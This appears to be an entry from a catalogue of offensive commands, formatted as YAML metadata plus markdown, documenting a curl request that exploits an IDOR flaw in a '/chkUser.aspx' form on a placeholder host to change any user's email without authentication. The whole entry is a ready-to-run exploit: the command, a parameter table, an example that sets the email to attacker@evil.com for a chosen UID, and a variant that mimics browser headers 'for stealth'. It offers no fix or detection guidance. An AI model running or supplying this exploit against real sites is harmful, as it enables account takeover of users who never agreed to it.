---
data: >-
  curl -X POST https://target.edu/chkUser.aspx -H "Content-Type:
  application/x-www-form-urlencoded" -d
  "dummy=&sendingForm=6&UID=[YOUR_ID_HERE]&last=test&midd=&frst=test&serv=test&mail=dummyemail@dummy.tld&tLang=&course=1&school=Other+non-Government&other&freq=Rarely&test=1&reading_score=&listening_score=aaa&speaking_score=aaa&test_taken=Other&other_test=test&when=more+than+a+year+ago"
tags:
  - idor
  - web-exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:11.912Z'
id: c017cca7-c801-47f1-beca-d670b3337245
verified: false
validated: true
submitted: true
---
# unauthenticated-email-change-idor

## Command

```bash
curl -X POST https://target.edu/chkUser.aspx \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dummy=&sendingForm=6&UID=[YOUR_ID_HERE]&last=test&midd=&frst=test&serv=test&mail=dummyemail@dummy.tld&tLang=&course=1&school=Other+non-Government&other&freq=Rarely&test=1&reading_score=&listening_score=aaa&speaking_score=aaa&test_taken=Other&other_test=test&when=more+than+a+year+ago"
```

## Description

This curl command sends an unauthenticated POST request to exploit IDOR in /chkUser.aspx, changing the email for the specified UID to enable account takeover.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| UID | Numeric user ID to target | Yes |
| mail | New email address to set | Yes |
| sendingForm | Form identifier (set to 6) | Yes |
| freq | Frequency value (e.g., Rarely) | No |
| frst | First name (dummy) | No |
| last | Last name (dummy) | No |
| serv | Service (dummy) | No |
| course | Course selection (1) | No |
| school | School (Other non-Government) | No |
| test | Test flag (1) | No |
| reading_score | Empty | No |
| listening_score | Dummy score (aaa) | No |
| speaking_score | Dummy score (aaa) | No |
| test_taken | Test type (Other) | No |
| other_test | Other test (test) | No |
| when | Timing (more than a year ago) | No |

## Examples

### Basic Usage

```bash
curl -X POST https://target.edu/chkUser.aspx -H "Content-Type: application/x-www-form-urlencoded" -d "...&UID=12345&mail=attacker@evil.com&..."
```

### Advanced Usage

Include full headers from browser for stealth:

```bash
curl -X POST https://target.edu/chkUser.aspx \
  -H "User-Agent: Mozilla/5.0..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "..."
```

## Expected Output

HTTP 200 OK with success response (e.g., no error message); user's email updated server-side.

## Related

- [[Related Procedure: Exploit-IDOR-to-Change-User-Email]]
